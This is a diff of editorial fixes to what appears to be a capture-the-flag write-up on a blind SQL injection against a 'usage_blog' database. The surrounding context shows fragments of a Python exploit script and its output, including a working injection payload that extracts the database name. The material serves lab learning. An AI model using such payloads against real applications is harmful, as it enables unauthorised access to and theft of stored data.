@@ -115,7 +115,7 @@ And access it:
 
 <br />
 
-But nothing interesting or helpful is available within the application.
+At this stage, no sensitive `functionalities` were accessible from the `user` dashboard.
 
 <br />
 
@@ -219,7 +219,7 @@ As we can see, the response to this `payload` was successful.
 
 What does this mean?
 
-This tells us that the first character of the database name is `"u"`.
+This confirms that the first character of the database name is `"u"`.
 
 At this point, we can spend a lot of time dumping all the content from the database.
 
@@ -279,7 +279,7 @@ def getCookies():
         sys.exit(1)
 
 def getDatabases():
-    p1 = log.progress(colored("Exploiting Bind SQL Injection", "yellow"))
+    p1 = log.progress(colored("Exploiting Blind SQL Injection", "yellow"))
     p2 = log.progress(colored("Databases", "yellow"))
     content = ""
 
@@ -384,7 +384,7 @@ We can execute and get the DB `user` and `hash`:
 /_/ /_/ /_/\___/_/ |_|\___/\__,_/_/      /_/ /_/ /_/\__/_/ /_/\___/_/     
                                                                           
 
-[▗] Exploiting Bind SQL Injection: test' or substring(database(),10,1)='g'-- -
+[▗] Exploiting Blind SQL Injection: test' or substring(database(),10,1)='g'-- -
 [◐] Databases: usage_blog
 
 [+] CURRENT DATABASE: usage_blog
